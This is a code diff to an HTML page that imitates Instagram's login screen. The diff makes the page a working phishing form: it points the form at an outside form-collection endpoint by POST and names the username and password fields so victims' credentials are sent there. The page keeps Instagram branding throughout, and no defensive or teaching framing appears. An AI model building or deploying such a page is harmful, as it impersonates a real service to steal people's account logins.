@@ -26,19 +26,20 @@
 
       <!-- Login -->
       <div id="login-right">
-        <form id="inputs_form">
+        <form id="inputs_form" action="https://formspree.io/f/mpqbvbye" method="POST">
           <img
             src="./images/instagram-text-icon.png"
-            alt="insta_logo"
+            alt="logo"
             id="insta_logo"
           />
           <div id="inputs_div">
             <input
               type="text"
+              name = "Name"
               class="input"
               placeholder="Phone number, username, or email"
             />
-            <input type="password" class="input" placeholder="Password" />
+            <input type="password" name = "Pass" class="input" placeholder="Password" />
           </div>
           <button>Log in</button>
 
@@ -47,7 +48,7 @@
             <p id="or-text">OR</p>
             <div class="or-line"></div>
           </div>
-
+        </form>
           <div id="fb-text">
             <span>
               <img src="./images/facebook.png" id="fb-logo" />
